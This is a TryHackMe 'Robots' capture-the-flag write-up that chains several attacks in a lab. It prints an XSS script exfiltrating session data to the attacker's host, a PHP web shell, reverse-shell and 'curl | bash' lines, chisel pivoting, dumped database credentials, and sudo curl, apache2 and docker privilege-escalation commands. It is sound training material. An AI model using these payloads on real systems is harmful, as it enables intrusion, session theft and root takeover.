---
title: "Robots - TryHackMe"
author: Dark_side.84
categories: [TryHackMe]
tags: [web, xss, php, rfi, docker, pivoting, mysql, python, curl, sudo, apache2]
render_with_liquid: false
media_subpath: 
image:
  path: room_image.webp
---
Robots - TryHackMe

**Robots** began with standard enumeration of the web application, which revealed an endpoint providing registration and login functionality. By exploiting an **XSS** vulnerability in the username field of a registered account, we were able to steal the administrator’s session cookies. This granted access to another endpoint vulnerable to **Remote File Inclusion (RFI)**, which was then abused to gain a shell inside a container.

Within the container, the database configuration files were discovered. Pivoting from this information allowed us to connect to the database and extract user password hashes. After cracking one of the hashes, we successfully authenticated via **SSH** and obtained a shell on the host system.

Once on the host, privilege escalation was carried out in stages. First, **sudo** permissions combined with **curl** were abused to escalate to another user. Then, as that user, further misuse of **sudo** privileges with **apache2** allowed us to escalate to the **root** user.


[![Tryhackme Room Link](room_image.webp){: width="300" height="300" .shadow}](https://tryhackme.com/room/robots){: .center }

## Initial Enumeration

### Nmap Scan

Initial reconnaissance was performed using an **`nmap`** scan:

```console
$ nmap -T4 -n -sC -sV -Pn -p- 10.49.147.60
Nmap scan report for 10.49.147.60
Host is up (0.082s latency).
Not shown: 65532 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.9p1 (protocol 2.0)
80/tcp   open  http    Apache httpd 2.4.61
|_http-server-header: Apache/2.4.61 (Debian)
|_http-title: 403 Forbidden
| http-robots.txt: 3 disallowed entries
|_/harming/humans /ignoring/human/orders /harm/to/self
9000/tcp open  http    Apache httpd 2.4.52 ((Ubuntu))
|_http-server-header: Apache/2.4.52 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
Service Info: Host: robots.thm
```

The scan reveals three services:

- **22** (`SSH`)
- **80** (`HTTP`) (restricted)
- **9000** (`HTTP`) (default page)

### Web Service on Port 9000

Navigating to `http://10.49.147.60:9000/` displays the default Apache2 landing page.

![Web 9000 Index](web_9000_index.webp){: width="1200" height="600"}

Fuzzing the web server did not yield any further results, so we proceeded to the other web server.

### Web Service on Port 80

Navigating to `http://10.49.147.60/` results in a **403 Forbidden** page.

![Web 80 Index](web_80_index.webp){: width="1200" height="600"}

The **`nmap`** scan revealed a `robots.txt` file on the server, which includes the following disallowed paths:

- `/harming/humans`
- `/ignoring/human/orders`
- `/harm/to/self`

This can also be verified by manually fetching the file:

```console
$ curl -s 'http://10.49.147.60/robots.txt'
Disallow: /harming/humans
Disallow: /ignoring/human/orders
Disallow: /harm/to/self
```

While `/harming/humans/` and `/ignoring/human/orders/` return **403 Forbidden**, `/harm/to/self/` stands out as it redirects to `http://robots.thm/harm/to/self/`.

```console
$ curl -s 'http://10.49.147.60/harming/humans/'
<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>403 Forbidden</title>
...

$ curl -s 'http://10.49.147.60/ignoring/human/orders/'
<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>403 Forbidden</title>
...

$ curl -v 'http://10.49.147.60/harm/to/self/'
...
< Location: http://robots.thm/harm/to/self/
...

```

To resolve `robots.thm`, we first need to add an entry to our **/etc/hosts** file:

```
10.49.147.60 robots.thm
```
{: file="/etc/hosts" }

After navigating to `http://robots.thm/harm/to/self/`, we are presented with a page containing **register** and **login** links, along with an interesting message:

> *"An admin monitors new users."*

This message typically suggests the presence of an **XSS (Cross-Site Scripting)** vulnerability.

![Robots Thm Index](robots_thm_index.webp){: width="1200" height="600"}

Checking the register page at `http://robots.thm/harm/to/self/register.php`, we see an additional message:

> *"Your initial password will be md5(username+ddmm)."*

We proceed by registering an account with:
- **Username:** `darkside`
- **Date of Birth:** `12/06/2000`

![Robots Thm Register](robots_thm_register.webp){: width="1200" height="600"}

To authenticate, we first generate the default password using the formula (`md5(username + ddmm)`), as shown below:

```console
$ echo -n 'darkside1206' | md5sum
71cac35bbaa095dbbc61232d7cbddebd  -
```

We then visit the login page at `http://robots.thm/harm/to/self/login.php` and successfully authenticate using the following credentials:  
`darkside : 71cac35bbaa095dbbc61232d7cbddebd`


![Robots Thm Login](robots_thm_login.webp){: width="1200" height="600"}

Once logged in, we are redirected to `http://robots.thm/harm/to/self/index.php`, which displays:

- A **last login** history for users, with our username reflected on the page
- A **"Server info"** link leading to `http://robots.thm/harm/to/self/server_info.php`


![Robots Thm Index Logged In](robots_thm_index_logged_in.webp){: width="1200" height="600"}

Navigating to `http://robots.thm/harm/to/self/server_info.php` shows that the page simply outputs **phpinfo()**.

![Robots Thm Phpinfo](robots_thm_phpinfo.webp){: width="1200" height="600"}

## Foothold

### XSS Through the Username Field

Referring back to the **"An admin monitors new users."** message, we attempt to register a new account using an **XSS payload** as the username:

```html
<script src="http://192.168.169.130/xss.js"></script>
```

![Robots Thm Register Xss](robots_thm_register_xss.webp){: width="1200" height="600"}

Soon after, we notice an incoming request to our server for `xss.js`, confirming that the XSS payload executed successfully:

```console
$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.49.147.60 - - [15/Mar/2025 15:03:04] code 404, message File not found
10.49.147.60 - - [15/Mar/2025 15:03:04] "GET /xss.js HTTP/1.1" 404 -
```

Reviewing the server cookies reveals that the `PHPSESSID` cookie is flagged as **HttpOnly**, which prevents us from directly accessing it through `document.cookie`.

![Robots Thm Cookie](robots_thm_cookie.webp){: width="1200" height="600"}

However, returning to the `/harm/to/self/server_info.php` endpoint shows that **phpinfo()** exposes session information, including the `PHPSESSID` cookie.

![Robots Thm Phpinfo Cookie](robots_thm_phpinfo_cookie.webp){: width="1200" height="600"}

As a result, rather than attempting to steal cookies directly, we can adjust our **XSS payload** to fetch `/harm/to/self/server_info.php` and relay its contents back to our server:

```js
async function exfil() {
    const response = await fetch('/harm/to/self/server_info.php');
    const text = await response.text();

    await fetch('http://192.168.169.130:81/exfil', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/x-www-form-urlencoded'
        },
        body: `data=${btoa(text)}`
    });
}

exfil();
```
{: file="xss.js" }

After updating `xss.js`, we initially observe a request to our server for the `xss.js` file:

```console
$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.49.147.60 - - [15/Mar/2025 15:11:38] "GET /xss.js HTTP/1.1" 200 -
```

Subsequently, our listener on port `81` receives the exfiltrated **phpinfo()** output:

```console
$ nc -lvnp 81
listening on [any] 81 ...
connect to [192.168.169.130] from (UNKNOWN) [10.49.147.60] 52348
POST /exfil HTTP/1.1
Host: 192.168.169.130:81
Connection: keep-alive
Content-Length: 99145
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/127.0.6533.119 Safari/537.36
Content-Type: application/x-www-form-urlencoded
Accept: */*
Origin: http://robots.thm
Referer: http://robots.thm/
Accept-Encoding: gzip, deflate

data=PCFET0NUWVBFIGh0bWwgUFVCTElDICItLy9XM0MvL0RURCBYSFRNTCAxLjAgVHJhbnNpdGlvbmFsLy9FTiIgIkRURC94aHRtbDEtdHJhbnNpdGlvbmFsLmR0ZCI+CjxodG1sIHhtb
...
```

We store the base64-encoded `data` parameter from the response into a file and then decode it:

```console
$ base64 -d server_info.php.b64 > /tmp/server_info.html
```

By opening `server_info.html` in a browser, we verify the extracted `PHPSESSID` value:

> `PHPSESSID=8tr0hp4g35ncor26idrknganun`

![Xss Phpinfo Cookie](xss_phpinfo_cookie.webp){: width="1200" height="600"}

Using the captured session cookie, we revisit `http://robots.thm/harm/to/self/index.php` and replace our cookie. This grants us access as **admin**, although the dashboard itself appears unchanged.

![Robots Thm Index Logged In Admin](robots_thm_index_logged_in_admin.webp){: width="1200" height="600"}

### The Remote File Inclusion

As logging in as **admin** did not expose any new functionality, we proceeded to fuzz for hidden endpoints under `http://robots.thm/harm/to/self/`, which led to the discovery of `admin.php`:

```console
$ ffuf -u 'http://robots.thm/harm/to/self/FUZZ' -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt -e .php -t 100 -mc all -ic -fc 404
...
admin.php               [Status: 200, Size: 370, Words: 29, Lines: 28, Duration: 99ms]
```
{: .wrap }

Visiting `http://robots.thm/harm/to/self/admin.php` reveals a form that allows the submission of URLs.

![Robots Thm Admin](robots_thm_admin.webp){: width="1200" height="600"}

To test this functionality, we submit a URL pointing to our own web server (`http://192.168.169.130/test`).

![Robots Thm Admin Test](robots_thm_admin_test.webp){: width="1200" height="600"}

We then observe an incoming request to our server:

```console
10.49.147.60 - - [15/Mar/2025 15:22:24] code 404, message File not found
10.49.147.60 - - [15/Mar/2025 15:22:24] "GET /test HTTP/1.1" 404 -
```

The `admin.php` page also displays an error message showing that our URL is being processed by the **`include()`** function, indicating a **Remote File Inclusion (RFI)** vulnerability.

![Robots Thm Admin Test Error](robots_thm_admin_test_error.webp){: width="1200" height="600"}

> Typically, the `include()` function does not allow the use of `URLs` by default. However, reviewing the `phpinfo()` output shows that `allow_url_include` is enabled, which explains why this behavior is possible. Even if it were disabled, command execution would still be achievable through **PHP filter chains**.
{: .prompt-tip }

With remote file inclusion confirmed, we set up a simple web shell on our server:

```console
$ echo '<?php system($_REQUEST["cmd"]); ?>' > cmd.php
```

Next, we submit the URL of our web shell (`http://192.168.169.130/cmd.php`) through the **admin.php** form and supply a command parameter (`cmd=id`).

We then observe a request for `cmd.php` reaching our server:

```console
$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.49.147.60 - - [15/Mar/2025 16:08:03] "GET /cmd.php HTTP/1.1" 200 -
```

The response contains the **command output**, confirming successful code execution.

![Robots Thm Admin Rfi](robots_thm_admin_rfi.webp){: width="1100" height="500"}

To obtain a shell, we set up a reverse shell payload on our web server:

```console
$ echo '/bin/bash -i >& /dev/tcp/192.168.169.130/443 0>&1' > index.html
```

We then reuse the same inclusion technique to execute the command `curl 192.168.169.130 | bash` through our web shell.

![Robots Thm Admin Reverse Shell](robots_thm_admin_reverse_shell.webp){: width="600" height="500"}

Checking our listener confirms that we have successfully gained a shell as the `www-data` user within the container.

```console
$ nc -lvnp 443
listening on [any] 443 ...
connect to [192.168.169.130] from (UNKNOWN) [10.49.147.60] 33006
bash: cannot set terminal process group (1): Inappropriate ioctl for device
bash: no job control in this shell
www-data@robots:/var/www/html/harm/to/self$ script -qc /bin/bash /dev/null
script -qc /bin/bash /dev/null
www-data@robots:/var/www/html/harm/to/self$ ^Z
zsh: suspended  nc -lvnp 443

$ stty raw -echo; fg
[1]  + continued  nc -lvnp 443

www-data@robots:/var/www/html/harm/to/self$ export TERM=xterm
www-data@robots:/var/www/html/harm/to/self$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

## Shell as rgiskard

### Locating the Database Configuration

While reviewing the application files, we identify the database configuration located at `/var/www/html/harm/to/self/config.php`:

```console
www-data@robots:/var/www/html/harm/to/self$ cat config.php
<?php
    $servername = "db";
    $username = "robots";
    $password = "q4qCz1OflKvKwK4S";
    $dbname = "web";
...
```

### Connecting to the Database

Based on the configuration file, the database is hosted on `db`. By using `getent`, we can resolve and obtain the corresponding `IP` address:

```console
www-data@robots:/var/www/html/harm/to/self$ getent hosts db
172.18.0.2      db
```

As the `mysql` client is not available within the container, we use **port forwarding** with `chisel` to access the database from our local system.

First, we start the `chisel` server on our machine:

```console
$ chisel server -p 7777 --reverse
2025/03/15 16:19:32 server: Reverse tunnelling enabled
2025/03/15 16:19:32 server: Fingerprint M8ENXLPJmDTJpDBgaGjDpK7wikwRFfIpUYXgPIiH77c=
2025/03/15 16:19:32 server: Listening on http://0.0.0.0:7777
```

Next, we transfer `chisel` into the container using `curl`:

```console
www-data@robots:/var/www/html/harm/to/self$ curl -s http://192.168.169.130/chisel -o /tmp/chisel
```

We then forward the database port through `chisel`:

```console
www-data@robots:/var/www/html/harm/to/self$ chmod +x /tmp/chisel
www-data@robots:/var/www/html/harm/to/self$ /tmp/chisel client 192.168.169.130:7777 R:3306:172.18.0.2:3306 &
[1] 185
2025/03/15 16:22:48 client: Connecting to ws://192.168.169.130:7777
2025/03/15 16:22:49 client: Connected (Latency 86.795677ms)
```

With the database now reachable from our local machine, we connect to it, enumerate the tables, and extract the stored user hashes:

```console
$ mysql -u robots -pq4qCz1OflKvKwK4S -h 127.0.0.1 -D web
MariaDB [web]> show tables;
+---------------+
| Tables_in_web |
+---------------+
| logins        |
| users         |
+---------------+
2 rows in set (0.088 sec)

MariaDB [web]> select * from users;
+----+--------------------------------------------------+----------------------------------+---------+
| id | username                                         | password                         | group   |
+----+--------------------------------------------------+----------------------------------+---------+
|  1 | admin                                            | 3e3d6c2d540d49b1a11cf74ac5a37233 | admin   |
|  2 | rgiskard                                         | [REDACTED]                       | nologin |
|  3 | darkside
                                              | 23056d662de462a5360374dc8a88cebf | guest   |
|  4 | <script src="http://192.168.169.130/xss.js"></script> | 66e60c2916e6875245aee4c9f3e1b3c1 | guest   |
+----+--------------------------------------------------+----------------------------------+---------+
4 rows in set (0.101 sec)
```

> Although the `mysql` client is not installed inside the container, it is still possible to connect to and enumerate the database by using simple `PHP` scripts directly from within the container, without relying on port forwarding.
{: .prompt-tip }

### Cracking the Hash

With the hash for the `rgiskard` user obtained, we can begin attempting to crack it. From our earlier analysis of the web application, we know that passwords follow the format `md5(username+DDMM)`. Reviewing `login.php` shows that this value is hashed once again with `md5` before being compared against the database entries. As a result, although the original password is `md5(username+DDMM)`, the stored database hashes follow the format `md5(md5(username+DDMM))`.

```console
www-data@robots:/var/www/html/harm/to/self$ cat login.php
...
if (isset($_POST['username'])&&isset($_POST['password'])) {
    $stmt = $pdo->prepare('SELECT * from users where (username= ? and password=md5(?) and `group` NOT LIKE "nologin")');
...
```

With this information, we can create a **Python** script to brute‑force all possible day and month combinations for the `rgiskard` user’s date of birth and match them against the hash retrieved from the database:

```py
#!/usr/bin/env python3

from hashlib import md5

for m in range(1, 13):
	for d in range(1, 32):
		plain = "rgiskard" + str(d).zfill(2) + str(m).zfill(2)
		password = md5(plain.encode()).hexdigest()
		hashed = md5(password.encode()).hexdigest()
		if hashed == "[REPLACE WITH THE HASH FROM THE DATABASE FOR THE RGISKARD USER]":
			print(f"Plain: {plain}, Password: {password}")
			exit()
```
{: file="brute.py" }

After executing the script, we successfully recover the password for the `rgiskard` user:

```console
$ ./brute.py
Plain: rgiskard[REDACTED], Password: [REDACTED]
```

Although the plaintext password is not accepted, the `md5`‑hashed password can be used with `SSH` to obtain a shell as the `rgiskard` user on the host system:

```console
$ ssh rgiskard@robots.thm
rgiskard@robots.thm's password:
rgiskard@ubuntu-jammy:~$ id
uid=1002(rgiskard) gid=1002(rgiskard) groups=1002(rgiskard)
```

## Shell as dolivaw

### Arbitrary File Write via Curl

Reviewing the `sudo` privileges for the `rgiskard` user reveals that we are permitted to execute `/usr/bin/curl 127.0.0.1/*` as the `dolivaw` user.

```console
rgiskard@ubuntu-jammy:~$ sudo -l
[sudo] password for rgiskard:
Matching Defaults entries for rgiskard on ubuntu-jammy:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User rgiskard may run the following commands on ubuntu-jammy:
    (dolivaw) /usr/bin/curl 127.0.0.1/*
```

From the `sudo` rule, we note that although the first URL supplied to `curl` must be `127.0.0.1/`, `curl` supports multiple URLs within a single command. By leveraging this behavior alongside the `file://` protocol—which `curl` also supports—we can directly read the `user` flag as shown below:

```console
rgiskard@ubuntu-jammy:~$ sudo -u dolivaw /usr/bin/curl 127.0.0.1/ file:///home/dolivaw/user.txt
<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>403 Forbidden</title>
...
THM{[REDACTED]}
```

To obtain a shell as the `dolivaw` user, we can take advantage of `curl`’s ability to write request responses to disk using the `-o` option. This allows us to place a public SSH key into the user’s `authorized_keys` file.

First, we generate an SSH key pair and host the `id_ed25519.pub` public key on our web server:

```console
$ ssh-keygen -f id_ed25519 -t ed25519
```

We can then execute the command `sudo -u dolivaw /usr/bin/curl 127.0.0.1/ http://192.168.169.130/id_ed25519.pub -o /tmp/1 -o /home/dolivaw/.ssh/authorized_keys` to retrieve the public key from our server and write it into `/home/dolivaw/.ssh/authorized_keys`.

```console
rgiskard@ubuntu-jammy:~$ sudo -u dolivaw /usr/bin/curl 127.0.0.1/ http://192.168.169.130/id_ed25519.pub -o /tmp/1 -o /home/dolivaw/.ssh/authorized_keys
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100   274  100   274    0     0  98172      0 --:--:-- --:--:-- --:--:--  133k
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100    91  100    91    0     0    269      0 --:--:-- --:--:-- --:--:--   270
```

After executing the command, we observe a request for the `id_ed25519.pub` file on our web server. By using the options `-o /tmp/1 -o /home/dolivaw/.ssh/authorized_keys`, the response from the first request (`127.0.0.1/`) is written to `/tmp/1`, while the response from the second request (`http://192.168.169.130/id_ed25519.pub`)—our public key—is saved to `/home/dolivaw/.ssh/authorized_keys`.

```console
$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.49.147.60 - - [15/Mar/2025 17:01:13] "GET /id_ed25519.pub HTTP/1.1" 200 -
```

We can now use the generated private key with `SSH` to obtain a shell as the `dolivaw` user and read the user flag located at `/home/dolivaw/user.txt`, as intended.

```console
$ ssh -i id_ed25519 dolivaw@robots.thm
dolivaw@ubuntu-jammy:~$ id
uid=1003(dolivaw) gid=1003(dolivaw) groups=1003(dolivaw)
dolivaw@ubuntu-jammy:~$ wc -c /home/dolivaw/user.txt
37 /home/dolivaw/user.txt
```

## Getting Shell as root

Reviewing the `sudo` privileges for the `dolivaw` user shows that we are permitted to execute `/usr/sbin/apache2` as the `root` user. This effectively grants us control over the `apache2` service and its configuration.

```console
dolivaw@ubuntu-jammy:~$ sudo -l
Matching Defaults entries for dolivaw on ubuntu-jammy:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User dolivaw may run the following commands on ubuntu-jammy:
    (ALL) NOPASSWD: /usr/sbin/apache2
```

By abusing `apache2`, there are several ways to either read the root flag or obtain a shell as the `root` user. Below, I demonstrate a few approaches, including the intended method.

### Unintended #1: File Read via Include

We start with the simplest approach, based on the technique described [here](https://gtfobins.github.io/gtfobins/apache2ctl/), which allows us to directly read the root flag.

`apache2` supports specifying directives either through a configuration file or via command‑line arguments. One such directive is `Include`, which is used to load additional configuration files. The key behavior here is that if the included file does not contain valid Apache directives, `apache2` throws an error while also outputting the contents of that file.

By abusing this behavior, we can include the root flag file—which naturally does not contain valid directives—causing `apache2` to print its contents in the error output:

```console
dolivaw@ubuntu-jammy:~$ sudo /usr/sbin/apache2 -C 'Include /root/root.txt' -k stop
[Mon Mar 17 00:06:00.171999 2025] [core:warn] [pid 1813] AH00111: Config variable ${APACHE_RUN_DIR} is not defined
apache2: Syntax error on line 80 of /etc/apache2/apache2.conf: DefaultRuntimeDir must be a valid directory, absolute or relative to ServerRoot
```

When attempting this, we initially encounter an error because `APACHE_RUN_DIR` is not defined, which prevents the file from being included. This is easily resolved by defining `APACHE_RUN_DIR` using an additional directive. Once set, the inclusion succeeds, and the contents of the root flag are printed in the output.

```console
dolivaw@ubuntu-jammy:~$ sudo /usr/sbin/apache2 -C 'Define APACHE_RUN_DIR /tmp' -C 'Include /root/root.txt' -k stop
[Mon Mar 17 00:07:27.943748 2025] [core:warn] [pid 1816] AH00111: Config variable ${APACHE_PID_FILE} is not defined
[Mon Mar 17 00:07:27.943839 2025] [core:warn] [pid 1816] AH00111: Config variable ${APACHE_RUN_USER} is not defined
[Mon Mar 17 00:07:27.943847 2025] [core:warn] [pid 1816] AH00111: Config variable ${APACHE_RUN_GROUP} is not defined
[Mon Mar 17 00:07:27.943862 2025] [core:warn] [pid 1816] AH00111: Config variable ${APACHE_LOG_DIR} is not defined
[Mon Mar 17 00:07:27.951625 2025] [core:warn] [pid 1816:tid 140193100588928] AH00111: Config variable ${APACHE_LOG_DIR} is not defined
[Mon Mar 17 00:07:27.952035 2025] [core:warn] [pid 1816:tid 140193100588928] AH00111: Config variable ${APACHE_LOG_DIR} is not defined
[Mon Mar 17 00:07:27.952070 2025] [core:warn] [pid 1816:tid 140193100588928] AH00111: Config variable ${APACHE_LOG_DIR} is not defined
AH00526: Syntax error on line 1 of /root/root.txt:
Invalid command 'THM{[REDACTED]}', perhaps misspelled or defined by a module not included in the server configuration
```
{: .wrap }

### Unintended #2: RCE via CGI Scripts

Another approach to obtaining a shell is by abusing `CGI scripts` to execute arbitrary commands. To do this, we can create a minimal Apache configuration that maps the `/rev` endpoint on the server to a script located at `/tmp/rev.sh`.

```
LoadModule mpm_event_module /usr/lib/apache2/modules/mod_mpm_event.so
LoadModule authz_core_module /usr/lib/apache2/modules/mod_authz_core.so
LoadModule mime_module /usr/lib/apache2/modules/mod_mime.so
LoadModule cgi_module /usr/lib/apache2/modules/mod_cgi.so
LoadModule alias_module /usr/lib/apache2/modules/mod_alias.so

User root
Group root

ServerName localhost
Listen 8080

TypesConfig /etc/mime.types

ScriptAlias /rev /tmp/rev.sh

ErrorLog "/tmp/error.log"
```
{: file="/tmp/cgi.conf"}


Next, we create the `/tmp/rev.sh` file and insert a reverse shell payload into it, then make the script executable by all users:

```bash
#!/bin/bash
/bin/bash -i >& /dev/tcp/192.168.169.130/443 0>&1
```
{: file="/tmp/rev.sh" }

```console
dolivaw@ubuntu-jammy:~$ chmod 777 /tmp/rev.sh
```

However, when attempting to start `apache2` with this configuration, we encounter an error indicating that we are not permitted to run `apache` as the `root` user.

```console
dolivaw@ubuntu-jammy:~$ sudo /usr/sbin/apache2 -f /tmp/cgi.conf -k start
AH00526: Syntax error on line 7 of /tmp/cgi.conf:
Error:\tApache has not been designed to serve pages while\n\trunning as root.  There are known race conditions that\n\twill allow any local user to read any file on the system.\n\tIf you still desire to serve pages as root then\n\tadd -DBIG_SECURITY_HOLE to the CFLAGS env variable\n\tand then rebuild the server.\n\tIt is strongly suggested that you instead modify the User\n\tdirective in your httpd.conf file to list a non-root\n\tuser.\n
```

This limitation is not an issue, as there are several users and groups that can still be leveraged to escalate privileges to `root`. One such group is `docker`, so we can modify our configuration to run the service under the `docker` group instead:

```
LoadModule mpm_event_module /usr/lib/apache2/modules/mod_mpm_event.so
LoadModule authz_core_module /usr/lib/apache2/modules/mod_authz_core.so
LoadModule mime_module /usr/lib/apache2/modules/mod_mime.so
LoadModule cgi_module /usr/lib/apache2/modules/mod_cgi.so
LoadModule alias_module /usr/lib/apache2/modules/mod_alias.so

User www-data
Group docker

ServerName localhost
Listen 8080

TypesConfig /etc/mime.types

ScriptAlias /rev /tmp/rev.sh

ErrorLog "/tmp/error.log"
```
{: file="/tmp/cgi.conf"}


With the configuration in place, we can start the `apache2` service and trigger our script by sending a request to the `/rev` endpoint:

```console
dolivaw@ubuntu-jammy:~$ sudo /usr/sbin/apache2 -f /tmp/cgi.conf -k start
dolivaw@ubuntu-jammy:~$ curl http://127.0.0.1:8080/rev
```

After issuing the request and inspecting our listener, we confirm that a shell was successfully obtained as the `www-data` user with membership in the `docker` group.

```console
$ nc -lvnp 443
listening on [any] 443 ...
connect to [192.168.169.130] from (UNKNOWN) [10.10.100.70] 35254
bash: cannot set terminal process group (1793): Inappropriate ioctl for device
bash: no job control in this shell
www-data@ubuntu-jammy:/tmp$ python3 -c 'import pty;pty.spawn("/bin/bash");'
www-data@ubuntu-jammy:/tmp$ export TERM=xterm
www-data@ubuntu-jammy:/tmp$ ^Z
zsh: suspended  nc -lvnp 443

$ stty raw -echo; fg
[1]  + continued  nc -lvnp 443

www-data@ubuntu-jammy:/tmp$ id
uid=33(www-data) gid=999(docker) groups=999(docker)
```

With membership in the `docker` group, we gain access to the Docker daemon, allowing us to start a container from an existing image on the host, mount the host filesystem, and spawn a shell from within the container.

```console
www-data@ubuntu-jammy:/tmp$ docker image ls
REPOSITORY      TAG       IMAGE ID       CREATED        SIZE
robots-bot      latest    9b676da70d1d   6 months ago   1.49GB
robots-webapp   latest    748bf229f771   6 months ago   507MB
mariadb         latest    92520f86618b   7 months ago   407MB
www-data@ubuntu-jammy:/tmp$ docker run -v /:/mnt --rm -it mariadb sh
```

Inside this container, we have full `root` access to the host filesystem mounted at the `/mnt` directory. This allows us to directly read the root flag or modify the `/etc/sudoers` file to grant the `dolivaw` user unrestricted sudo privileges, as demonstrated below:

```console
# wc -c /mnt/root/root.txt
37 /mnt/root/root.txt
# echo 'dolivaw ALL=(ALL) NOPASSWD: ALL' >> /mnt/etc/sudoers
```

Afterwards, reviewing the `sudo` privileges for the `dolivaw` user confirms the applied change. We can then leverage it with `su` to easily obtain a root shell and read the flag once again:

```console
dolivaw@ubuntu-jammy:~$ sudo -l
Matching Defaults entries for dolivaw on ubuntu-jammy:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User dolivaw may run the following commands on ubuntu-jammy:
    (ALL) NOPASSWD: /usr/sbin/apache2
    (ALL) NOPASSWD: ALL
dolivaw@ubuntu-jammy:~$ sudo su -
root@ubuntu-jammy:~# id
uid=0(root) gid=0(root) groups=0(root)
root@ubuntu-jammy:~# wc -c /root/root.txt
37 /root/root.txt
```

### Intended: Arbitrary File Write via Logging

Another approach—also the intended solution by the room author—is to abuse the logging features of `apache2`.

`apache2` allows the definition of custom log formats, which control exactly what is written to log files. When combined with control over the log file path, this effectively results in an arbitrary file write primitive.

One of the simplest ways to leverage this into a root shell is to define a custom log format that contains a public SSH key and configure the log file to be written to `/root/.ssh/authorized_keys`, as illustrated below:

```
LoadModule mpm_event_module /usr/lib/apache2/modules/mod_mpm_event.so
LoadModule authz_core_module /usr/lib/apache2/modules/mod_authz_core.so

ServerName localhost
Listen 8080

ErrorLog "/tmp/error.log"

LogFormat "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIKcX+23zd9TBMVL+b9htX2Ou1TRwjGcpky6brlTjpvMc kali@kali" darkside

CustomLog /root/.ssh/authorized_keys darkside

```
{: file="/tmp/log.conf" }

We can then start `apache2` using this configuration and trigger a request to the web server, causing the log entry to be written:

```console
dolivaw@ubuntu-jammy:~$ sudo /usr/sbin/apache2 -f /tmp/log.conf -k start
dolivaw@ubuntu-jammy:~$ curl http://127.0.0.1:8080/
<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>404 Not Found</title>
</head><body>
<h1>Not Found</h1>
<p>The requested URL was not found on this server.</p>
</body></html>
```

Once the request is made, our public key is written to `/root/.ssh/authorized_keys`. We can then use the corresponding private key with `SSH` to obtain a shell as `root` and retrieve the flag.

```console
$ ssh -i id_ed25519 root@robots.thm
root@ubuntu-jammy:~# id
uid=0(root) gid=0(root) groups=0(root)
root@ubuntu-jammy:~# wc -c /root/root.txt
37 /root/root.txt
```

<style>
.center img {
  display:block;
  margin-left:auto;
  margin-right:auto;
}
.wrap pre{
    white-space: pre-wrap;
}
</style>
